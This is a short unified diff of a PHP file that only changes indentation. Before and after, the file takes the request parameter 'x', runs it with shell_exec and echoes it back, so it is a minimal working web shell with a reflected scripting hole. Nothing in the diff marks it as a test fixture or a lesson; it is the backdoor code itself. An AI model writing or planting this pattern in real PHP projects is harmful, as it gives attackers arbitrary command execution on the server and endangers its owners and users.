@@ -1,9 +1,9 @@
 <?php
 
-$x = $_REQUEST['x'];
+  $x = $_REQUEST['x'];
 
-shell_exec($x);
+  shell_exec($x);
 
-echo $x;
+  echo $x;
 
 ?>
